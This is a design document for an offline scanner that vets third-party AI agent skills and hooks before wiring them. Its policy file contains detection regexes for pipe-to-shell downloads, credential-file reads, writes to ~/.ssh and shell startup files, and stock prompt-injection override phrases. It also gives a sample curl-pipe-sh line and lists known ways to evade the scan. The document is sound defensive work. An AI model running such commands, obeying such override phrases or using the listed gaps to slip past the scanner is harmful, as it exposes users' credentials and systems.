# Design: vetting

## Context

- Wired content (skills, agents, soon rules and hooks) executes with the user's privileges. 160 skills and 26 agents are wired on the reference Mac; most come from submodules the-grid does not control.
- Evidence the threat is real: Snyk (2026-02, vendor) scanned 3,984 skills: 76 confirmed malicious, 13.4% critical, 36.82% other-severity. An academic scan (arXiv 2605.28588, search snippet only, not read) reports 26.1% of 31,132 skills with at least one vulnerability. Treat numbers as vendor-sourced; the direction is not in doubt. Snyk's advice: popularity is not a safety proxy; updates can mutate a vetted skill (workstream 3's lock pins the reviewed commit; this change only scans).
- Prior art studied: ECC `scripts/build-pi-core.js` safety scan. It fails the build on callable URLs outside a host allowlist, pipe-to-shell, fetch-and-run `npx`, secrets, absolute home paths and symlinks, with a scoped `scanAllowlist` (path + `contains` + reason) and a per-exclusion `CURATION.md`. ECC also has `scripts/ci/check-unicode-safety.js` (emoji and invisible-character scan) and `scan-supply-chain-iocs.js`.
- Taken from ECC: the secret shapes, pipe-to-shell forms, home-path rule, the `path + contains + reason` allowlist, "every exclusion has a reason". Left out: the documentation-URL host allowlist (noisy, low value), blanket `npx pkg@version` ban (a pinned version is the fix, not the problem), blanket symlink ban (only symlinks that escape the scanned directory are flagged).
- No scanner exists here today. `scripts/gate.sh` runs shellcheck, catalog, compose and bats. `scripts/wire.sh` links skills with no inspection. `baseline-submodules.txt` and `machines/*.txt` are gitignored (personal), so anything tracked and public (policy, curation) must be machine-agnostic.

## Approach

```
policy.yaml ──┐
CURATION.md ──┼─> scripts/audit.py DIR... ──> report (text|json) + exit 0/1/2
(allowlist)   │        ▲
miniyaml.py ──┘        │ list of dirs/files
              scripts/audit.sh --wired | --owned | --gate     (selects the list)
                       ▲                         ▲
              scripts/wire.sh (pre-link)    scripts/gate.sh (check "audit")
                       ▲
              WS3 `grid install` (staged dirs; calls audit.py directly)
```

- `audit.py` is pure: reads files, never writes, never touches the network. Same input and policy give byte-identical output.
- `audit.sh` only decides WHICH directories to scan.
  - `--owned`: whichever of `skills/*/`, `agents/*.md`, `rules/`, `hooks/`, `agent-factory/roles/*/`, `agent-factory/_core/` exist.
  - `--wired`: dry-run `wire.sh` into throwaway `SKILLS_DIR`/`AGENTS_DIR` (the same trick `wire.sh --check` uses, with `GRID_SKIP_CATALOG=1 GRID_SKIP_AUDIT=1`), then `readlink` every symlink there. The result is exactly what a real wire would link, with the same manifest, overlay and precedence logic, and no second implementation of it.
  - `--gate`: owned always; wired too when `baseline-submodules.txt` exists and no submodule is uninitialised; otherwise print one loud notice naming what was skipped.
- Severity model: two levels. `high` blocks (exit 1). `low` warns (printed, exit 0). A rule can start high and be downgraded to low by context (test file, negating prose, code comment).
- Findings the user has reviewed go in the allowlist (CURATION.md). Findings that are false-positive CLASSES get fixed in the rule, not allowlisted line by line.

## File formats

### policy.yaml (tracked, repo root)

Verified: the file below parses identically under PyYAML and under the restricted reader specified later, and every regex was exercised against positive and negative sample lines during design (samples become the bats fixtures).

```yaml
# policy.yaml — what `grid audit` flags. Restricted YAML subset (see design.md).
version: 1

# Directories (relative to --root) whose content the-grid owns; everything else is upstream tier.
owned_roots: [skills, agents, rules, hooks, agent-factory]
skip_dirs: ['.git', 'node_modules']

sources:
  allowed_hosts: [github.com]
  allowed_repos:
    - anthropics/skills
    - garrytan/gstack
    - jeffallan/claude-skills
    - mattpocock/skills
    - obra/superpowers
    - Fission-AI/openspec
    - DietrichGebert/ponytail

limits:
  max_file_bytes: 1048576

negation: '(?i)\b(?:never|do not|don.t|must not|mustn.t|avoid|reject|refuse|anti-pattern|bad|wrong|unsafe|attack|malicious|injection|e\.g\.|for example|example)\b'

classes:
  - name: test
    globs: ['test/**', 'tests/**', '**/test/**', '**/tests/**', '**/__tests__/**', '**/*.test.*', '**/*.spec.*', '**/fixtures/**', 'evals/**']
  - name: hook
    globs: ['hooks/**', '**/hooks/**', '**/hooks.json', '**/*-hook', '**/*-hook.*']
  - name: script
    globs: ['**/*.sh', '**/*.bash', '**/*.zsh', '**/*.py', '**/*.js', '**/*.mjs', '**/*.cjs', '**/*.ts', '**/*.rb', '**/*.ps1', '**/bin/**']
  - name: config
    globs: ['**/*.json', '**/*.toml', '**/*.yaml', '**/*.yml', '**/.mcp.json']
  - name: doc
    globs: ['**/*.md', '**/*.mdx', '**/*.txt', '**/*.tmpl']

builtin:
  hidden-unicode: high
  symlink-escape: high
  binary-exec: low
  oversize-file: low
  frontmatter-hook: low
  source-not-allowed: high
  source-uncurated: high
  allow-unused: low

rules:
  - id: curl-pipe-shell
    severity: high
    message: downloads and executes remote code
    regex: '\b(?:curl|wget)\b[^\n|]*\|\s*(?:sudo\s+)?(?:(?:ba|z|fi|da)?sh|python3?|node|ruby|perl)\b|\b(?:ba|z)?sh\s+<\(\s*(?:curl|wget)|\beval\s+"?\$\(\s*(?:curl|wget)'
    downgrade: [negation, comment, test]
  - id: npx-unpinned
    severity: high
    message: npx -y runs whatever is currently published; pin pkg@x.y.z
    regex: '\bnpx\s+(?:-y|--yes)\b|"args"\s*:\s*\[\s*"(?:-y|--yes)"'
    ignore_regex: '\bnpx\s+(?:(?:-y|--yes)\s+)+(?:--?\S+\s+)*@?[\w./-]+@\d|"(?:-y|--yes)"\s*,\s*"@?[\w./-]+@\d'
    downgrade: [negation, comment, test]
  - id: latest-tag
    severity: low
    severity_by_class: {script: high, hook: high, config: high}
    message: '@latest is unpinned; pin an exact version'
    regex: '@latest\b'
    downgrade: [negation, comment, test]
  - id: uvx-unpinned
    severity: low
    severity_by_class: {script: high, hook: high, config: high}
    message: uvx without a pinned version
    regex: '\buvx\s+[-\w.]'
    ignore_regex: '\buvx\s+(?:--?\S+\s+)*[\w.-]+(?:==|@)\d|--from\s+\S+=='
    downgrade: [negation, comment, test]
  - id: secret-shape
    severity: high
    message: looks like a credential
    regex: '(?<![A-Za-z0-9])(?:AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{22,}|sk-[A-Za-z0-9_-]{20,}|xox[baprs]-[A-Za-z0-9-]{10,}|AIza[0-9A-Za-z_-]{35})|-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----|eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
    ignore_regex: 'EXAMPLE|(?i:placeholder|your[_-]|x{6,}|dummy|fake|redacted)|\.\.\.'
    downgrade: []
  - id: home-path
    severity: low
    owned_severity: high
    message: absolute per-user home path (non-portable, may leak a username)
    regex: '(?<![\w.~:/-])/(?:Users|home)/(?!(?:you|user|username|me|name|someone|yourname|youruser|runner|\$|<|\{|\.\.\.|\*))[A-Za-z0-9_.-]+/|[A-Za-z]:\\Users\\(?!(?:you|user|username|name)\\)[A-Za-z0-9_.-]+\\'
    downgrade: [test]
  - id: ssh-write
    severity: high
    message: writes to ~/.ssh
    regex: '(?:>>?|\btee\b(?:\s+-a)?|\b(?:cp|mv|ln|install|rsync|scp)\b[^\n|;&]*?|\bsed\s+-i\S*[^\n|;&]*?)\s*["'']?(?:~|\$HOME|\$\{HOME\})/\.ssh/'
    downgrade: [negation, comment, test]
  - id: shell-rc-write
    severity: high
    message: modifies a shell startup file
    regex: '(?:>>?|\btee\b(?:\s+-a)?|\b(?:cp|mv|ln|install)\b[^\n|;&]*?|\bsed\s+-i\S*[^\n|;&]*?)\s*["'']?(?:~|\$HOME|\$\{HOME\})/\.(?:zshrc|zprofile|zshenv|bashrc|bash_profile|profile)\b|(?:>>?|\btee\b(?:\s+-a)?)\s*["'']?(?:~|\$HOME)/\.config/fish/config\.fish'
    downgrade: [negation, comment, test]
  - id: prompt-injection
    severity: high
    message: text that tries to override the agent's instructions
    regex: '(?i)\b(?:ignore|disregard|forget)\s+(?:all\s+|any\s+|your\s+)?(?:previous|prior|above|earlier|preceding)\s+(?:instructions|prompts|rules|guidelines|context)|\byou\s+are\s+now\s+(?:in\s+)?(?:developer\s+mode|DAN|jailbroken|unrestricted)|\b(?:do\s+not|don.t|never)\s+(?:tell|inform|reveal\s+(?:this\s+)?to|mention\s+(?:this\s+)?to)\s+the\s+user'
    downgrade: [negation, test]
  - id: base64-blob
    severity: low
    severity_by_class: {script: high, hook: high}
    message: long base64-looking blob
    regex: '[A-Za-z0-9+/]{256,}={0,2}'
    ignore_regex: 'data:[\w/+.-]+;base64,'
    skip_ext: ['.svg', '.json', '.map', '.ipynb', '.xsd', '.lock', '.min.js']
    downgrade: [test]
  - id: hook-network
    severity: high
    applies: [hook]
    message: hook makes a network call
    regex: '\b(?:curl|wget|nc|ncat|telnet|ssh|scp)\s|https?://|\bfetch\s*\(|requests\.(?:get|post|put)|\burllib|\bhttp\.client|Invoke-WebRequest|XMLHttpRequest'
    ignore_regex: 'https?://(?:localhost|127\.0\.0\.1|\[::1\])'
    downgrade: [comment, test]
  - id: credential-read
    severity: low
    severity_by_class: {script: high, hook: high}
    message: reads a credential store
    regex: '(?:~|\$HOME|\$\{HOME\})/(?:\.ssh/id_\w+|\.aws/credentials|\.netrc|\.config/gh/hosts\.yml|\.docker/config\.json|\.npmrc|\.git-credentials)|Library/Keychains|security\s+find-(?:generic|internet)-password'
    downgrade: [negation, comment, test]
```

- `owned_roots`: directories (relative to `--root`) whose content is the-grid's own. Anything else is `upstream` tier. `skip_dirs`: directory names never descended into.
- `allowed_repos` above is the initial seed (the repos behind the tracked example baseline); group 4 finalises it.

### Rule semantics (how audit.py evaluates a line)

1. Class of the file = first `classes` entry whose any glob matches the path relative to the scanned directory; none matches -> `other`. A line inside a `SKILL.md`/agent `.md` frontmatter `hooks:` block is class `hook` regardless of file class.
2. A rule runs on a line only if its `applies` list (absent = all classes) contains the line's class, the file extension is not in `skip_ext`, `regex` matches, and `ignore_regex` (if any) does not match the same line.
3. Base severity = `severity_by_class[class]` else `severity`. Tier `owned` raises it to `owned_severity` when present.
4. Downgrade to `low` if any listed context holds:
   - `test`: file class is `test`.
   - `negation`: the line matches the policy-wide `negation` regex AND the line class is `doc` or `other` (prose only; never in scripts, hooks, config).
   - `comment`: the line starts with `#`, `//`, `*`, `/*` or `<!--` (after whitespace) AND the class is `script`, `hook` or `config`.
5. A finding that matches an allowlist entry is moved to `allowed` (counted, hidden unless `--show-allowed`).
6. Glob translation: implement with `re`, not `fnmatch` (`fnmatch`'s `*` crosses `/`). `**/` = zero or more directories, `**` = anything, `*` = anything except `/`.
7. Built-in checks (not regex; ids and severities come from `builtin:`):
   - `hidden-unicode`: any of U+202A-202E, U+2066-2069 (bidi controls, "Trojan Source"), U+E0000-E007F (tag characters, "ASCII smuggling"), U+200B, U+200E, U+200F, U+2060-2064 (zero-width and invisible operators), U+200C and U+200D, U+FEFF. Exceptions: U+FEFF as the very first character of a file (BOM); U+200C/U+200D when the preceding character is >= U+0600 and not in U+2000-U+206F (Arabic/Indic/emoji joiners). In class `test` the finding is `low`. Reported per line (not per character).
   - `symlink-escape`: a symlink inside the scanned tree whose resolved target is outside that tree. Symlinks are never followed.
   - `binary-exec`: ELF, Mach-O or PE magic at the start of a file. Binary files are otherwise skipped (a NUL in the first 8 KiB means binary).
   - `oversize-file`: file larger than `limits.max_file_bytes`; not scanned, reported.
   - `frontmatter-hook`: every `command:` line inside a frontmatter `hooks:` block is listed so a skill that registers a hook is visible in the report even when clean.
8. Excerpts are truncated to 120 chars and every non-printable or invisible code point is rendered as `\uXXXX`, so the report cannot itself carry bidi or zero-width text.

### Restricted YAML (scripts/lib/miniyaml.py)

PyYAML is not in the stdlib and the scanner must run on a bare machine, in CI, and at install time before any venv exists. `policy.yaml` and the `audit-allow` block therefore use a small subset. Anything outside it is a hard parse error naming the line (exit 2), never a silent mis-parse.

Supported:
- `#` comments (full-line, or after whitespace outside quotes); blank lines.
- Block maps (`key: value`, `key:` + indented block), indentation by spaces only, any consistent width.
- Block lists (`- scalar`, `- key: value` starting a map item, continuation keys indented under the first key).
- Inline lists `[a, 'b c']` and inline maps `{k: v}` (one line, nesting allowed, quotes respected when splitting on commas).
- Scalars: single-quoted (`''` is an escaped quote; backslashes are literal, which is why every regex is single-quoted), double-quoted (JSON escapes), `true`/`false`, integers, bare strings.

Not supported (error): anchors/aliases, multi-line scalars (`|`, `>`), tags, flow collections spanning lines, tabs for indentation, duplicate keys. API: `miniyaml.loads(text) -> dict|list`, raises `miniyaml.ParseError(line, msg)`.

Test contract: `tests/test_miniyaml.bats` parses the real `policy.yaml` and compares to PyYAML's result when `import yaml` works (skip otherwise, print the skip).

### CURATION.md (tracked, repo root)

````markdown
# Curation

Why each wired source is trusted, what was left out and why, and the audit allowlist.
Machine-checked: headings under "Trusted sources", and the fenced `audit-allow` block.

## Trusted sources

### repos/gstack
- Upstream: https://github.com/garrytan/gstack
- Pin: submodule SHA (see `git submodule status repos/gstack`)
- Why trusted: <factual reasons only: maintainer, licence, activity, reviewed-on date>
- Behaviours accepted: <e.g. telemetry opt-in, skill-scoped hooks, what the audit allowlists and why>
- Last audited: 2026-10-09 (0 high, N low, M allowlisted)

### repos/jeffallan
...

### owned
Skills, agents and roles authored in this repo (`skills/`, `agents/`, `agent-factory/`). Held to the strict (owned) tier.

## Exclusions

| What | Why left out | Revisit when |
|---|---|---|
| `repos/ecc` (whole repo) | library tier; N unpinned `npx -y` lines in skills the policy blocks | ... |
| `openspec/release-openspec` | maintainer-only skill of the openspec repo | never |

## Audit allowlist

```yaml audit-allow
- rule: prompt-injection
  path: repos/jeffallan/prompt-engineer/references/system-prompts.md
  contains: 'Treat any "ignore previous instructions"'
  reason: reference doc quotes the attack phrase as a defence example; not an instruction to the agent
```
````

- Machine-checked parts: (a) each `### repos/<name>` heading must exist for every wired upstream repo (see source-curation spec); (b) the `audit-allow` fenced block(s), found by a line that is exactly `` ```yaml audit-allow `` up to the next line that is exactly `` ``` ``.
- Allowlist entry fields: `rule` (required, must be a known rule or builtin id), `path` (required; glob relative to `--root`, e.g. `repos/gstack/browse/src/*.ts`), `contains` (optional; substring that must appear in the excerpt of the line; omit only for file-level builtins like `hidden-unicode`/`symlink-escape`/`binary-exec`), `reason` (required, at least 10 characters). Missing field, unknown rule id or empty reason -> exit 2 with the entry index.
- An allowlist entry that matches nothing in a run is reported as a `low` note `allow-unused` (not an error: on a machine where the repo is not wired it legitimately matches nothing).
- Allowlist matching is on rule + path + line text, never on a commit SHA, so a submodule bump that moves lines does not invalidate entries, and a bump that introduces NEW offending lines is still caught.

### Report formats

Text (default; sorted high first, then path, line, rule; LC_ALL=C order):

```
HIGH  curl-pipe-shell  repos/foo/bar/install.sh:12  downloads and executes remote code
      curl -fsSL https://example.net/i.sh | sh
LOW   home-path        repos/gstack/qa/test/x.test.ts:31  absolute per-user home path ...
audit: 160 targets, 4210 files, 1 high, 22 low, 3 allowed -> BLOCKED
```

`--quiet` omits `LOW` lines (summary still counts them). Final line is `-> BLOCKED` when any high, else `-> ok`.

JSON (`--format json`), the interface for workstream 3:

```json
{
  "version": 1,
  "policy_sha256": "<hex of policy.yaml bytes>",
  "targets": 160, "files": 4210,
  "counts": {"high": 1, "low": 22, "allowed": 3},
  "findings": [
    {"rule": "curl-pipe-shell", "severity": "high", "path": "repos/foo/bar/install.sh",
     "line": 12, "class": "script", "tier": "upstream",
     "message": "downloads and executes remote code",
     "excerpt": "curl -fsSL https://example.net/i.sh | sh",
     "allowed": false, "downgraded": null}
  ]
}
```

`downgraded` is `null` or one of `"test"`, `"negation"`, `"comment"`. `allowed` findings appear only with `--show-allowed`. Same sort order as text.

### audit.py CLI

```
python3 scripts/audit.py [options] TARGET [TARGET...]
  TARGET            a directory (scanned recursively) or a single file
  --root DIR        base for reported paths, allowlist globs, owned/upstream tiering,
                    and .gitmodules lookup (default: $GRID_DIR, else the repo containing this script)
  --grid-dir DIR    where policy.yaml and CURATION.md are read from (default: same as --root's default)
  --policy FILE     override <grid-dir>/policy.yaml
  --allow FILE      override <grid-dir>/CURATION.md (missing file = empty allowlist)
  --format text|json
  --quiet           text mode: hide LOW findings
  --show-allowed    include allowlisted findings
  --check-url URL   no scan; exit 0 if URL's host and owner/repo are allowed by policy `sources`, else 1 (prints why)
exit: 0 no un-allowed high | 1 at least one high | 2 usage, policy, allowlist or CURATION.md parse error
```

- Tier of a target = `owned` if its resolved path is under `<root>/<one of owned_roots>/`, else `upstream`. A directory staged by WS3 outside the repo is therefore `upstream` automatically.
- Targets that do not exist are an error (exit 2), not a silent skip.

## Integration

### wire.sh

Insert before "1. Tear down ALL grid-owned symlinks":

```bash
# --- 0. Vet before touching any link -------------------------------------------
# Skipped in --check's throwaway run (GRID_SKIP_CATALOG) and in audit.sh's own
# dry run (GRID_SKIP_AUDIT, prevents recursion). Skipped LOUDLY when the tool or
# policy is absent, so mock grids in tests and bare machines still wire.
if [ -z "${GRID_SKIP_AUDIT:-}" ] && [ -z "${GRID_SKIP_CATALOG:-}" ]; then
  if [ ! -f "$GRID_DIR/policy.yaml" ]; then
    echo "wire: no policy.yaml - audit skipped"
  elif ! command -v python3 >/dev/null 2>&1; then
    echo "wire: python3 missing - audit SKIPPED, skills wired unaudited" >&2
  elif ! bash "$(dirname "$0")/audit.sh" --wired --quiet; then
    if [ "${GRID_AUDIT:-}" = warn ]; then
      echo "wire: audit found high-severity issues; GRID_AUDIT=warn so wiring continues" >&2
    else
      echo "wire: BLOCKED by audit (nothing was changed). Fix, allowlist in CURATION.md with a reason, or set GRID_AUDIT=warn once." >&2
      exit 3
    fi
  fi
fi
```

Existing links are untouched on a block: the audit runs before teardown, so a bad upstream bump cannot leave a machine half-wired. `audit.sh` exit 2 (broken policy) also blocks.

### gate.sh

New check named `audit` after `compose`:

```bash
run_audit() {
  [ -f scripts/audit.sh ] || { echo "    scripts/audit.sh absent - skipped"; SKIPPED+=(audit); return 0; }
  command -v python3 >/dev/null || { echo "    python3 absent - skipped"; SKIPPED+=(audit); return 0; }
  bash scripts/audit.sh --gate --quiet
}
check audit run_audit
```

`tests/test_gate.bats` runs a COPY of gate.sh in a stub repo with no python3 and no audit.sh; the new check must therefore skip loudly there (its existing assertions only grep for names in the skipped list, so adding `audit` does not break them). Add one gate test proving the skip.

### Interface for workstream 3 (manifest-lock-install)

- Staged content: `python3 scripts/audit.py --format json --root <staging-root> <staged-dir>...` BEFORE any link or cache promotion; abort the install on exit 1 or 2. Stage under a path like `<staging-root>/repos/<name>/...` so allowlist globs in CURATION.md (`repos/<name>/...`) apply unchanged.
- Source URLs in `grid.yaml`: validate with `python3 scripts/audit.py --check-url <url>`. `policy.yaml` `sources.allowed_repos` is the single allowlist; `grid.yaml` must not carry a second one.
- Record `policy_sha256` and the result per skill in the ledger if useful (suggestion, not required here). The audit verdict is only meaningful for the exact content scanned; `grid.lock` content hashes (WS3) are what tie a verdict to bytes.
- `grid audit` (WS3's CLI) = `exec bash scripts/audit.sh "$@"`. This change creates no `grid` binary.
- This change never reads `grid.yaml` or `grid.lock`.

## Expected false positives

Measured on an unoptimised prototype of exactly this policy (indicative, re-measured by group 4). Wired set on the reference Mac (160 skill dirs, 26 agents): about 10 s, 0 symlink escapes, 0 oversize files, 0 binaries.

- gstack (wired, partial):
  - `prompt-injection`: `browse/src/cli.ts:1033` lists attack phrases it detects (code, so negation does not apply) -> allowlist with reason.
  - `hidden-unicode`: `browse/src/server.ts:122` strips zero-width characters from a token; `design-html/vendor/pretext.js` is a minified third-party library containing them -> allowlist both (the minified one by path, no `contains`).
  - `low`: about 9 `prompt-injection` and 8 `home-path` hits in `browse/test/*` fixtures (test class, capped), 1 `credential-read`, 1 `curl-pipe-shell` in `careful/bin/check-careful.sh:89` (a comment: "curl|sh stays MEDIUM"; comment downgrade).
  - Not in wired skill dirs, so not scanned unless it moves: gstack's `hosts/claude/hooks/*`, `bin/gstack-telemetry-*` (network calls, global `~/.claude/settings.json` edits via `./setup`). If those are ever wired as hooks they hit `hook-network` high: correct, by design (telemetry egress in a hook should need a reasoned allowlist entry).
- jeffallan: 4 `prompt-injection` highs in `prompt-engineer/references/{evaluation-frameworks,system-prompts}.md` (quoted attack examples, some on lines where negation words are absent) -> allowlist with reason. 4 `latest-tag` lows, 1 `credential-read` low (`security-reviewer` reference documents scanner patterns).
- anthropic: 1 `latest-tag` low (`go install ...@latest`). BOM-prefixed XML schemas under `docx/` are exempt by the BOM rule (a raw scan without it reports 9).
- ponytail, owned skills: `latest-tag` lows on documented `npm i -g ...@latest` (the OpenSpec install line). Owned tier is otherwise clean (0 high) today.
- ECC (`repos/ecc`, library tier, not wired; run as a promotion dry run):
  - 17 `npx-unpinned` highs, all true positives under this policy (`angular-developer/references/mcp.md` x5 in `"args": ["-y", ...]` form, `taste-distillation/` and `taste-application/` scripts, `autonomous-agent-harness`, `windows-desktop-e2e`). ECC's own pi-core build excludes the skills that do this; promoting any ECC skill means pinning, excluding or allowlisting it, and CURATION.md records which.
  - 1 `prompt-injection` high: `tdd-workflow/SKILL.md:24` states plan text such as "ignore previous rules" is data, not instructions (negation words absent) -> allowlist.
  - lows: 6 `home-path` (example paths), 4 `latest-tag`, 2 `curl-pipe-shell` (`github-ops` warns against it), 1 `uvx-unpinned`.
  - ECC `hooks/`, `scripts/hooks/`, `.mcp` configs and `plugins/` are outside `skills/`; they were not measured. Group 4 runs the scanner over them once and records the result in CURATION.md (expected: `hook-network`, `credential-read` highs).
- Known gaps (false NEGATIVES, accepted and documented in CURATION.md):
  - line-based: a pattern split across lines, or JSON `"command": "uvx"` with args on the next line, is missed.
  - obfuscation (string concatenation, `eval` of decoded strings below the 256-char blob threshold) is missed.
  - the `negation` downgrade can be gamed by an attacker who writes "never" on the line; the finding still prints as `low`, so it is not hidden, just not blocking.
  - code that fetches and runs a payload at skill-run time, from a script that is itself clean, is invisible to static scanning.
  - the scan covers what is on disk at audit time; a later `git pull` in a submodule needs a re-run (wire.sh and gate do that).

## Decisions

- Decided: scanner is `scripts/audit.py` (Python 3 stdlib only) with `scripts/audit.sh` as the directory selector; bash cannot do the Unicode and class logic cleanly and every machine already needs python3 for agent-factory.
- Decided: `policy.yaml` uses a restricted YAML subset read by `scripts/lib/miniyaml.py`, because PyYAML is not stdlib and the scanner must run before any venv exists; unsupported syntax is a hard error.
- Decided: all regexes in `policy.yaml` are single-quoted scalars so backslashes are literal and need no escaping.
- Decided: two severities only (`high` blocks, `low` warns); no `medium`, no per-rule thresholds.
- Decided: downgrades are explicit per rule (`test`, `negation`, `comment`) so each rule's noise handling is readable in the policy, not buried in code.
- Decided: `negation` downgrade applies to prose (`doc`/`other` class) only, never to scripts, hooks or config, because a script cannot "warn" its way out of executing.
- Decided: `secret-shape` has no downgrades and its placeholder exemption is the `ignore_regex` (`EXAMPLE`, `placeholder`, `your_`, `xxxxxx`, `...`).
- Decided: upstream tier warns on `home-path`, owned tier blocks (`owned_severity: high`), because the repo rule is no personal data in public files.
- Decided: tier is decided by `owned_roots` relative to `--root`, not by "is it under repos/", so content staged by WS3 anywhere is `upstream`.
- Decided: `npx -y` is flagged unless a version is pinned on the same line (`pkg@1.2.3`); bare `npx tool` without `-y` is not flagged (npx prompts before installing).
- Decided: `@latest` is `high` in script, hook and config files and `low` in prose, since prose is an install instruction to a human and files are executed.
- Decided: `uvx` and `@latest` pins are judged per line; multi-line JSON arg lists are a documented gap, not a feature to build.
- Decided: `hook-network` applies only to class `hook` (hooks directories, `hooks.json`, `*-hook` files, frontmatter `hooks:` blocks); ordinary skill scripts may call APIs and are not flagged for it. Loopback hosts are ignored.
- Decided: add `credential-read` (reads of `~/.ssh/id_*`, `~/.aws/credentials`, `~/.netrc`, keychain, etc.) beyond the listed scope because credential theft is the dominant malicious-skill pattern; `low` in prose, `high` in scripts and hooks.
- Decided: the base64 rule needs 256+ contiguous base64 characters and is `high` only in script and hook files; `data:...;base64,` lines and `.svg/.json/.map/.ipynb/.xsd/.lock/.min.js` files are skipped.
- Decided: the allowlist lives in CURATION.md inside a fenced `audit-allow` block (one file for humans and the scanner, per the brief), keyed on rule + path glob + `contains`, `reason` mandatory.
- Decided: a false-positive CLASS hit in 3 or more places is fixed in `policy.yaml` (`ignore_regex`, `downgrade`); fewer than 3 are allowlisted with a reason.
- Decided: unused allowlist entries are a `low` note (`allow-unused`), never an error, because uninitialised or unwired repos legitimately match nothing.
- Decided: scan every file on disk (not only git-tracked) because generated files are also loaded; skip `.git` and `node_modules`; never follow symlinks; flag only symlinks escaping the scanned tree.
- Decided: files over 1 MiB are reported as `oversize-file` (`low`) and not scanned; binaries are skipped except executable magic, reported as `binary-exec` (`low`).
- Decided: BOM at byte 0 and joiners after Arabic/Indic/emoji-range characters are exempt from `hidden-unicode`; everything else listed is `high`.
- Decided: report excerpts escape invisible and non-printable code points as `\uXXXX`.
- Decided: wire.sh audits BEFORE teardown and exits 3 on a block, so a blocked wire changes nothing; `GRID_AUDIT=warn` is the only override and it prints a warning.
- Decided: wire.sh does NOT block when `policy.yaml` or `python3` is absent (it prints why); a bare machine and every existing mock-grid test must still wire.
- Decided: `gate.sh` audits owned assets always and the wired set only when a baseline exists and all submodules are initialised; otherwise audit.sh prints a notice and the gate still passes that part. CI therefore checks owned assets only.
- Decided: fixtures for tests are generated inside the bats test (temp dir, `printf` assembly of tokens and invisible characters), never committed, so no fake credential or injection phrase sits in the repo for push-protection or for the audit's own scan of `tests/` to trip on.
- Decided: this change adds no network access, no model calls and no new dependency; `audit.sh` and `audit.py` are offline and deterministic.
- Decided: the source allowlist is `owner/repo` granular (`allowed_repos`), host-restricted to `github.com`, because trusting an owner trusts all their future repos.
- Decided: the source and curation checks (`source-not-allowed`, `source-uncurated`) are both `high`, and apply only to wired upstream repos, so library-tier submodules need no entry until promoted.
- Decided: CURATION.md's machine-checked structure is only `### repos/<name>` headings and the `audit-allow` block; exclusions are a human table, not parsed.
- Decided: `--check-url` exists for workstream 3 and is the only source-policy API; policy.yaml remains the single allowlist.
- Decided: ECC's documentation-URL host allowlist and blanket symlink ban are not adopted (noise; a link to a docs host is not an execution risk).
